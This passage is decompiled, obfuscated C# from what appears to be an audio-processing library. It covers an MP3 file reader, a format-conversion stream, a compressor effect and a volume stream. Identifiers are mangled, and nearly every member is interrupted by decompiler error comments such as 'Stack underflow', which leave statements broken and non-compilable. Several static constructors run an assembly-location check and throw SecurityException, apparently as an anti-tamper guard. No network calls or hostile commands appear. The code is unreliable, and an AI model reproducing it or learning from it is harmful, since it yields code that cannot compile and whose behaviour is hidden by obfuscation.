		public override global::_0005._0005 WaveFormat => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0004;
			}
			set
			{
				//IL_0125: Incompatible stack heights: 0 vs 1
				//IL_0131: Incompatible stack heights: 0 vs 2
				object obj = ((_0005)/*Error near IL_000a: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
				try
				{
					value = _0008_0003._0088_0006(_0008_0003._0087_0006(value, global::_0012._007E_0090_0002(this)), 0L);
					long num = value / this._0002;
					_001D._0008 obj2 = null;
					for (int i = 0; i < this._0001.Count; i++)
					{
						if (this._0001[i].SamplePosition + this._0001[i].SampleCount > num)
						{
							obj2 = this._0001[i];
							this._0001 = i;
							break;
						}
					}
					this._0004 = 0;
					m__0005 = 0;
					this._0002 = true;
					if (obj2 != null)
					{
						_007F_0002._007E_0083_0005(this._0001, obj2.FilePosition);
						long num2 = num - obj2.SamplePosition;
						if (num2 > 0)
						{
							this._0004 = (int)num2 * this._0002;
						}
					}
					else
					{
						_007F_0002._007E_0083_0005(this._0001, this._0001 + this._0002);
					}
					_0004 = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public _0017._0007 XingHeader => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0005(string _0017_0090_0006)
			: this((Stream)File.OpenRead(_0017_0090_0006), (_0001)global::_0011._0018._0001, _0019_0090_0006: true)
		{
		}

		public _0005(string _0017_0090_0006, _0001 _0018_0090_0006)
			: this(File.OpenRead(_0017_0090_0006), _0018_0090_0006, _0019_0090_0006: true)
		{
		}

		public _0005(Stream _000F_0090_0006)
			: this(_000F_0090_0006, (_0001)global::_0011._0018._0001, _0019_0090_0006: false)
		{
		}

		public _0005(Stream _000F_0090_0006, _0001 _0018_0090_0006)
			: this(_000F_0090_0006, _0018_0090_0006, _0019_0090_0006: false)
		{
		}

		private _0005(Stream _000F_0090_0006, _0001 _0018_0090_0006, bool _0019_0090_0006)
		{
			if (_000F_0090_0006 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107386095));
			}
			if (_0018_0090_0006 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107386110));
			}
			this.m__0001 = _0019_0090_0006;
			try
			{
				this._0001 = _000F_0090_0006;
				this.m__0001 = global::_0011._0018._0001(this._0001);
				this._0002 = this._0001.Position;
				global::_0005._0003 obj = global::_0011._0018._0001(this._0001);
				if (obj == null)
				{
					throw new InvalidDataException(_0080._0014._0001(107386077));
				}
				double num = obj.BitRate;
				this.m__0001 = global::_0011._0018._0001(obj);
				if (this.m__0001 != null)
				{
					this._0002 = this._0001.Position;
				}
				global::_0005._0003 obj2 = global::_0011._0018._0001(this._0001);
				if (obj2 != null && (obj2.SampleRate != obj.SampleRate || obj2.ChannelMode != obj.ChannelMode))
				{
					this._0002 = obj2.FileOffset;
					obj = obj2;
				}
				this._0001 = this._0001.Length - this._0002;
				this._0001.Position = this._0001.Length - 128;
				byte[] array = new byte[128];
				this._0001.Read(array, 0, 128);
				if (array[0] == 84 && array[1] == 65 && array[2] == 71)
				{
					_0002 = array;
					this._0001 -= 128L;
				}
				this._0001.Position = this._0002;
				Mp3WaveFormat = new _0016._0005(obj.SampleRate, (obj.ChannelMode == ChannelMode.Mono) ? 1 : 2, obj.FrameLength, (int)num);
				global::_0011._0018._0001(this);
				this._0001 = 0;
				num = (double)this._0001 * 8.0 / global::_0011._0018._0001(this);
				this._0001.Position = this._0002;
				Mp3WaveFormat = new _0016._0005(obj.SampleRate, (obj.ChannelMode == ChannelMode.Mono) ? 1 : 2, obj.FrameLength, (int)num);
				this.m__0001 = _0018_0090_0006(Mp3WaveFormat);
				this.m__0001 = this.m__0001.OutputFormat;
				this._0002 = this.m__0001.OutputFormat._0003 / 8 * this.m__0001.OutputFormat._0001;
				_0003 = 1152 * this._0002;
				this.m__0001 = new byte[_0003 * 2];
			}
			catch (Exception)
			{
				if (_0019_0090_0006)
				{
					_000F_0090_0006.Dispose();
				}
				throw;
			}
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0210: Incompatible stack heights: 0 vs 1
			int num = 0;
			object obj = ((_0005)/*Error near IL_0010: Stack underflow*/).m__0001;
			_0091_0002._009C_0005(obj);
			try
			{
				if (m__0005 != 0)
				{
					int num2 = _0016_0002._0018_0005(m__0005, _0004);
					_0099_0002._0010_0006(this.m__0001, this._0004, _0002, _0003, num2);
					m__0005 -= num2;
					if (m__0005 == 0)
					{
						this._0004 = 0;
					}
					else
					{
						this._0004 += num2;
					}
					num += num2;
					_0003 += num2;
				}
				int num3 = this._0001;
				if (this._0002)
				{
					this.m__0001._0001();
					this._0001 = _0016_0002._0019_0005(0, this._0001 - 3);
					_007F_0002._007E_0083_0005(this._0001, this._0001[this._0001].FilePosition);
					this._0002 = false;
				}
				while (num < _0004)
				{
					global::_0005._0003 obj2 = global::_0011._0018._0001(this);
					if (obj2 == null)
					{
						break;
					}
					int num4 = this.m__0001._0001(obj2, this.m__0001, 0);
					if (this._0001 > num3 && num4 != 0)
					{
						if (this._0001 == num3 + 1 && num4 == this._0003 * 2)
						{
							_0099_0002._0010_0006(this.m__0001, this._0003, this.m__0001, 0, this._0003);
							num4 = this._0003;
						}
						int num5 = _0016_0002._0018_0005(num4 - this._0004, _0004 - num);
						_0099_0002._0010_0006(this.m__0001, this._0004, _0002, _0003, num5);
						if (num5 + this._0004 < num4)
						{
							this._0004 = num5 + this._0004;
							m__0005 = num4 - this._0004;
						}
						else
						{
							this._0004 = 0;
							m__0005 = 0;
						}
						_0003 += num5;
						num += num5;
					}
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			this._0004 += num;
			return num;
		}

		protected override void _0001(bool _0002)
		{
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				if (((_0005)/*Error near IL_000b: Stack underflow*/)._0001 != null)
				{
					if (((_0005)/*Error near IL_0014: Stack underflow*/).m__0001)
					{
						global::_0008._007E_0004_0002(this._0001);
					}
					this._0001 = null;
				}
				if (this.m__0001 != null)
				{
					global::_0008._007E_0098(this.m__0001);
					this.m__0001 = null;
				}
			}
			global::_0005._008A(this, _0002);
		}
	}
}
namespace _007F
{
	internal sealed class _000E : global::_0006._0006
	{
		private new readonly Stream _0001;

		private new readonly global::_0005._0005 _0001;

		public override global::_0005._0005 WaveFormat => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;

		public override long Length
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0090_0002;
				Stream stream = ((_000E)/*Error near IL_000c: Stack underflow*/)._0001;
				/*Error near IL_0017: Stack underflow*/(stream);
				return (long)/*Error near IL_000f: Stack underflow*/;
			}
		}

		public override long Position
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0091_0002;
				Stream stream = ((_000E)/*Error near IL_000c: Stack underflow*/)._0001;
				/*Error near IL_0017: Stack underflow*/(stream);
				return (long)/*Error near IL_000f: Stack underflow*/;
			}
			set
			{
				//IL_001c: Unknown result type (might be due to invalid IL or missing references)
				//IL_001d: Unknown result type (might be due to invalid IL or missing references)
				//IL_0023: Expected I8, but got Unknown
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_0028: Incompatible stack heights: 0 vs 2
				//IL_002b: Incompatible stack heights: 0 vs 1
				_ = _007F_0002._007E_0083_0005;
				_ = ((_000E)/*Error near IL_000c: Stack underflow*/)._0001;
				int num = _0001.BlockAlign;
				_003F val = /*Error near IL_001d: Stack underflow*/% num;
				_003F val2 = /*Error near IL_001e: Stack underflow*/- val;
				/*Error near IL_0023: Stack underflow*/((object)/*Error near IL_0023: Stack underflow*/, (long)val2);
			}
		}

		public _000E(Stream _0010_0090_0006, global::_0005._0005 _0099_008F_0006)
		{
			this._0001 = _0010_0090_0006;
			_0001 = _0099_008F_0006;
		}

		public _000E(byte[] _001A_0090_0006, int _0080_0010, int _0013_0011, global::_0005._0005 _0099_008F_0006)
		{
			this._0001 = new MemoryStream(_001A_0090_0006, _0080_0010, _0013_0011);
			_0001 = _0099_008F_0006;
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0020: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0082._007E_0006_0004;
				_ = ((_000E)/*Error near IL_000c: Stack underflow*/)._0001;
				return /*Error near IL_0016: Stack underflow*/((object)/*Error near IL_0016: Stack underflow*/, (byte[])/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/, _0004);
			}
			catch (EndOfStreamException)
			{
				return 0;
			}
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0005
{
	internal sealed class _0008 : global::_0006._0006
	{
		internal new readonly _001C._0004 _0001;

		private new readonly global::_0006._0006 m__0001;

		internal new readonly _0005 _0001;

		private new global::_000E._0003 m__0001;

		private new global::_0019._0003 m__0001;

		private new global::_0004._0005 m__0001;

		private new long m__0001;

		public override _0005 WaveFormat => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public override long Length
		{
			get
			{
				//IL_002b: Incompatible stack heights: 0 vs 1
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					_0080._0014._0001(107385913);
					new InvalidOperationException((string?)/*Error near IL_0039: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				return global::_0011._0018._0001(this, global::_0012._007E_0090_0002(this.m__0001));
			}
		}

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0059: Incompatible stack heights: 0 vs 1
				//IL_0060: Incompatible stack heights: 0 vs 1
				//IL_0067: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					_0080._0014._0001(107386352);
					new InvalidOperationException((string?)/*Error near IL_0067: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				_007F_0002._007E_0083_0005(this.m__0001, global::_0011._0018._0001(this, value));
				this.m__0001 = global::_0011._0018._0001(this, global::_0012._007E_0091_0002(this.m__0001));
				global::_0011._0018._0001(this.m__0001._0001, 0);
			}
		}

		public _0008(_001C._0004 _001B_0090_0006, _0005 _0003_0090_0006)
		{
			this._0001 = _001B_0090_0006;
			this.m__0001 = _001B_0090_0006 as global::_0006._0006;
			this._0001 = _0003_0090_0006;
			this.m__0001 = new global::_0019._0003();
			_001E._0004 obj = this.m__0001._0001;
			_0005 obj2 = _001B_0090_0006.WaveFormat;
			if (!global::_0011._0018._0001(obj2, 0, obj))
			{
				throw new ArgumentException(_0080._0014._0001(107385988), _0080._0014._0001(107386095));
			}
			global::_0011._0018._0001(this.m__0001._0001, 0, _001B_0090_0006.WaveFormat);
			if (!global::_0011._0018._0001(0, _0003_0090_0006, this.m__0001._0001))
			{
				throw new ArgumentException(_0080._0014._0001(107385975), _0080._0014._0001(107385898));
			}
			global::_0011._0018._0001(this.m__0001._0001, 0, _0003_0090_0006);
			if (this.m__0001 != null)
			{
				this.m__0001 = global::_0011._0018._0001(this, this.m__0001.Position);
			}
			this.m__0001 = new global::_0004._0005(_001B_0090_0006.WaveFormat._0002);
			this.m__0001 = new global::_000E._0003(_0003_0090_0006._0002);
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0102: Incompatible stack heights: 0 vs 1
			//IL_010c: Incompatible stack heights: 0 vs 1
			int num = 0;
			while (num < _0004)
			{
				global::_0011._0018._0001(((_0008)/*Error near IL_0015: Stack underflow*/).m__0001._0001, 0);
				if ((int)/*Error near IL_0025: Stack underflow*/ != 0)
				{
					int num2 = (int)global::_0011._0018._0001(this, (long)(_0004 - num));
					byte[] array = new byte[num2];
					int num3 = this._0001.Read(array, 0, num2);
					if (num3 == 0)
					{
						break;
					}
					global::_0011._0018._0001(array, num3, this.m__0001);
					global::_0011._0018._0001(this.m__0001._0001, 0, (global::_0010._0004)this.m__0001, global::_000F._0004._0001, 0L, 0L);
					this.m__0001.MediaBuffer._0002(0);
					this.m__0001.StatusFlags = global::_0010._0003._0001;
					global::_0011._0018._0001(this.m__0001._0001, _001A._0001._0001, 1, new global::_000E._0003[1] { this.m__0001 });
					if (this.m__0001.Length == 0)
					{
						break;
					}
					this.m__0001._0001(_0002, _0003 + num);
					num += this.m__0001.Length;
				}
			}
			this.m__0001 += num;
			return num;
		}

		protected override void _0001(bool _0002)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			if (((_0008)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				((_0008)/*Error near IL_0010: Stack underflow*/).m__0001._0001();
				this.m__0001 = null;
			}
			this.m__0001._0001();
			if (this.m__0001 != null)
			{
				this.m__0001 = null;
			}
			global::_0005._008A(this, _0002);
		}
	}
}
namespace _0004
{
	internal sealed class _000E
	{
		[CompilerGenerated]
		private int _0001;

		[CompilerGenerated]
		private int _0002;

		[CompilerGenerated]
		private long _0001;

		public int Identifier
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string IdentifierAsString
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 2
				//IL_0028: Incompatible stack heights: 0 vs 2
				//IL_002f: Incompatible stack heights: 0 vs 1
				_ = _0013_0003._007E_008F_0006;
				_0082_0002._0088_0005();
				_ = _0012_0003._008E_0006;
				_ = ((_000E)/*Error near IL_002f: Stack underflow*/).Identifier;
				byte[] array = /*Error near IL_001a: Stack underflow*/((int)/*Error near IL_001a: Stack underflow*/);
				return /*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/, array);
			}
		}

		public int Length
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public long StreamPosition
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _000E(int _001C_0090_0006, int _0089_0010, long _001D_0090_0006)
		{
			Identifier = _001C_0090_0006;
			Length = _0089_0010;
			StreamPosition = _001D_0090_0006;
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001D
{
	internal sealed class _000E : global::_0006._0006
	{
		private new global::_0006._0006 m__0001;

		private new readonly _001A._0011 m__0001;

		private new byte[] m__0001;

		internal new bool _0001;

		internal new readonly int _0001;

		internal readonly int _0002;

		private new readonly object m__0001 = new object();

		public double MakeUpGain
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.MakeUpGain;
				return (double)/*Error near IL_000a: Stack underflow*/;
			}
			set
			{
				//IL_0033: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				object obj2 = default(object);
				if (0 == 0)
				{
					obj2 = obj;
				}
				_ = _0091_0002._009C_0005;
				/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
				try
				{
					this.m__0001.MakeUpGain = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
		}

		public double Threshold
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.Threshold;
				return (double)/*Error near IL_000a: Stack underflow*/;
			}
			set
			{
				//IL_0033: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				object obj2 = default(object);
				if (0 == 0)
				{
					obj2 = obj;
				}
				_ = _0091_0002._009C_0005;
				/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
				try
				{
					this.m__0001.Threshold = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
		}

		public double Ratio
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.Ratio;
				return (double)/*Error near IL_000a: Stack underflow*/;
			}
			set
			{
				//IL_0033: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				object obj2 = default(object);
				if (0 == 0)
				{
					obj2 = obj;
				}
				_ = _0091_0002._009C_0005;
				/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
				try
				{
					this.m__0001.Ratio = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
		}

		public double Attack
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.Attack;
				return (double)/*Error near IL_000a: Stack underflow*/;
			}
			set
			{
				//IL_0033: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				object obj2 = default(object);
				if (0 == 0)
				{
					obj2 = obj;
				}
				_ = _0091_0002._009C_0005;
				/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
				try
				{
					this.m__0001.Attack = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
		}

		public double Release
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.Release;
				return (double)/*Error near IL_000a: Stack underflow*/;
			}
			set
			{
				//IL_0033: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				object obj2 = default(object);
				if (0 == 0)
				{
					obj2 = obj;
				}
				_ = _0091_0002._009C_0005;
				/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
				try
				{
					this.m__0001.Release = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
		}

		public bool Enabled
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public override long Length
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0090_0002;
				global::_0006._0006 obj = ((_000E)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(obj);
				return (long)/*Error near IL_000f: Stack underflow*/;
			}
		}

		public override long Position
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0091_0002;
				global::_0006._0006 obj = ((_000E)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(obj);
				return (long)/*Error near IL_000f: Stack underflow*/;
			}
			set
			{
				//IL_0036: Incompatible stack heights: 0 vs 1
				//IL_003c: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
				try
				{
					_007F_0002._007E_0083_0005(this.m__0001, value);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public override global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override int BlockAlign
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.BlockAlign;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _000E(global::_0006._0006 _0010_0090_0006)
		{
			this.m__0001 = _0010_0090_0006;
			this._0001 = _0010_0090_0006.WaveFormat._0001;
			this._0002 = _0010_0090_0006.WaveFormat._0003 / 8;
			this.m__0001 = new _001A._0011(5.0, 10.0, _0010_0090_0006.WaveFormat._0001);
			this.m__0001.Threshold = 16.0;
			this.m__0001.Ratio = 6.0;
			this.m__0001.MakeUpGain = 16.0;
		}

		public override bool _0001(int _0002)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0006._0006)/*Error near IL_0017: Stack underflow*/)._0001((int)/*Error near IL_0017: Stack underflow*/);
			return (byte)/*Error near IL_000c: Stack underflow*/ != 0;
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_00e5: Incompatible stack heights: 0 vs 1
			//IL_00f1: Incompatible stack heights: 0 vs 2
			object obj = ((_000E)/*Error near IL_000a: Stack underflow*/).m__0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				if (this._0001)
				{
					if (this.m__0001 == null || this.m__0001.Length < _0004)
					{
						this.m__0001 = new byte[_0004];
					}
					int num = _0082._007E_0006_0004(this.m__0001, this.m__0001, 0, _0004) / (this._0002 * this._0001);
					double num3 = default(double);
					double num4 = default(double);
					for (int i = 0; i < num; i++)
					{
						int num2 = i * this._0002 * this._0001;
						global::_0011._0018._0001(ref num3, this, num2, this.m__0001, ref num4);
						global::_0011._0018._0001(ref num4, ref num3, this.m__0001);
						global::_0011._0018._0001(num3, this, _0002, _0003 + num2, num4);
					}
					return _0004;
				}
				return _0082._007E_0006_0004(this.m__0001, _0002, _0003, _0004);
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		protected override void _0002(bool _0002)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_000E)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_0004_0002;
				global::_0006._0006 obj = ((_000E)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this.m__0001 = null;
			}
			global::_0005._008A(this, _0002);
		}
	}
}
namespace _0011
{
	internal sealed class _0003 : global::_0015._0008
	{
		private new readonly Stream m__0001;

		public _0003(Stream _000F_008F, _0001 _0016_0090_0006 = null)
		{
			this.m__0001 = _000F_008F;
			base._0001(_0016_0090_0006);
		}

		protected override global::_0007._0013 _0001(_0001 _0002)
		{
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 1
			new _0019._0006(((_0003)/*Error near IL_0007: Stack underflow*/).m__0001);
			_0018._0001((object)/*Error near IL_006e: Stack underflow*/);
			global::_0007._0013 obj = _0018._0001((_0010)/*Error near IL_0010: Stack underflow*/);
			obj._0001(-2, _0003: false);
			obj._0001(-3, _0003: true);
			obj._0001(-3, IntPtr.Zero, new MediaType
			{
				MajorType = _0080._0010._0002,
				SubType = (_0002.RequestFloatOutput ? _001F._0011._0006 : _001F._0011._000F)
			}._0001);
			return obj;
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	internal sealed class _000E : global::_0006._0006
	{
		private new global::_0006._0006 _0001;

		private new readonly global::_0005._0005 _0001;

		private new readonly long _0001;

		private long m__0002;

		internal new bool _0001;

		internal new float _0001;

		private new readonly object _0001 = new object();

		private new byte[] _0001;

		public float Volume
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override int BlockAlign
		{
			get
			{
				//IL_000a: Unknown result type (might be due to invalid IL or missing references)
				//IL_000c: Expected I4, but got Unknown
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0014: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/)._0001.BlockAlign;
				return /*Error near IL_000b: Stack underflow*// 2;
			}
		}

		public override long Length => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_004d: Incompatible stack heights: 0 vs 1
				//IL_0053: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
				try
				{
					value -= value % BlockAlign;
					_007F_0002._007E_0083_0005(this._0001, value * 2);
					this.m__0002 = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public override global::_0005._0005 WaveFormat => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;

		public bool Clip
		{
			get
			{
